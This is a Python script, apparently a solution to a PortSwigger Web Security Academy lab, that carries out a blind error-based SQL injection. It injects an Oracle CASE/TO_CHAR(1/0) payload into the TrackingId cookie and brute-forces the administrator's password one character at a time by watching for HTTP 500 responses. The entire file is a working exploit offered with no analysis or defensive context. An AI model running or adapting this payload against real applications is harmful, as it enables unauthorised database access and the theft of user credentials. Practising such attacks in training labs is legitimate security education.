import requests 
import string 


url = 'https://0a0b00ef04f39ff680a6e047004e0047.web-security-academy.net/' 
passdata = list(string.ascii_letters+string.digits+string.punctuation)


admin_pass = []

for x in range(1,21):
    for c in passdata:
        cookie = {
                'TrackingId' : "yBSh4otrzCksaks3'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' )||'".format(x,c),'session':"XG3e9B0paLDdW0OnYyC6d4J2MmqViGb3"
            }
        print(cookie)
        resp = requests.get(url,cookies=cookie)
        if resp.status_code ==500:
            print('valid char',c)
            admin_pass.append(c)
            break

admin_password = ''.join(admin_pass)
print('The Asministrator Password is : ',admin_password)